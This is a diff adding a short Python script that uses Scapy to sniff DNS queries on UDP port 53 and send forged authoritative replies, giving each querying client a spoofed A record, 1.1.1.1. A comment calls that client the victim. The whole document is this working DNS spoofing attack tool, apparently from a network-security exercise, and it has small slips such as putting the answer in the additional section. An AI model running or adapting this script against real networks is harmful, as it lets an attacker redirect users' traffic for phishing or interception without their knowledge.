@@ -1,0 +1,41 @@
+from scapy.layers.dns import DNS, DNSQR, DNSRR
+from scapy.layers.inet import IP, UDP
+from scapy.layers.l2 import Ether
+from scapy.sendrecv import sendp, sniff
+
+
+def spoof(packet):
+    # if not dns request, return.
+    if not packet.haslayer(DNSQR):
+        return
+    # flip src and dst in ethernet, IP and transport layers.
+    eth = Ether(src=packet[Ether].dst, dst=packet[Ether].src)
+    ip = IP(src=packet[IP].dst, dst=packet[IP].src)
+    udp = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)
+    # build dns application layer.
+    dns = DNS(
+        id=packet[DNS].id, # same id as request
+        qd=packet[DNS].qd,
+        aa=1, # authoritative answer
+        rd=0, # recursion
+        qr=1, # message is dns replay.
+        qdcount=1,
+        ancount=1,
+        nscount=0,
+        arcount=0,
+        ar=DNSRR(
+            rrname=packet[DNS].qd.qname,
+            type='A',
+            ttl=30,
+            rdata='1.1.1.1') # this is the spoofed ip the client gets.
+    )
+    response_packet = eth / ip / udp / dns # stack the layer together.
+    response_packet.show() # send to victim.
+    sendp(response_packet)
+
+
+if __name__ == '__main__':
+    # sniff packets, filter by udp port 53, which is dns.
+    sniff(filter='udp dst port 53', prn=spoof)
+
+
